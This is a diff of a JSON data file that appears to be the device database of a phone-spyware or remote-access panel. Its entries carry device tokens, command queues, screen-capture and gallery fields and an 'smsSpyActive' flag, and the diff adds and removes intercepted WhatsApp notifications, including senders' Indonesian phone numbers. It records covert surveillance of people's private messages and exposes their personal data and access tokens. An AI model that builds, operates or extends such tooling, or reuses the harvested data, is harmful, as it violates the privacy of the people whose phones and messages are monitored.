@@ -68,7 +68,7 @@
     "deviceName": "HP-AGUSGANTENG123-3E9A",
     "ownerUsername": "zaa",
     "token": "20fdcadc903f75b92eda3edefa92e509",
-    "lastSeen": 1777373407315,
+    "lastSeen": 1777373419328,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:37:12.639Z",
@@ -1403,7 +1403,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777373408886,
+    "lastSeen": 1777373420957,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -1419,6 +1419,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "GB ALL GAME V¹ | REGZ STORE",
+        "content": "‎2 pesan baru",
+        "time": "28/04 17:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777373422288
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "GB ALL GAME V¹ | REGZ STORE: ~ MALZ STORE",
+        "content": "📷 ‎1 foto",
+        "time": "28/04 17:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777373422216
+      },
       {
         "appName": "WhatsApp",
         "sender": "+62 831-7933-3065",
@@ -5402,22 +5418,6 @@
         "time": "27/04 20:47",
         "pkg": "com.whatsapp",
         "receivedAt": 1777297662007
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 856-5985-6951",
-        "content": "💟 Stiker",
-        "time": "27/04 20:47",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777297658100
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 856-5985-6951",
-        "content": "💟 Stiker",
-        "time": "27/04 20:47",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777297658030
       }
     ],
     "galleryPhotos": [],
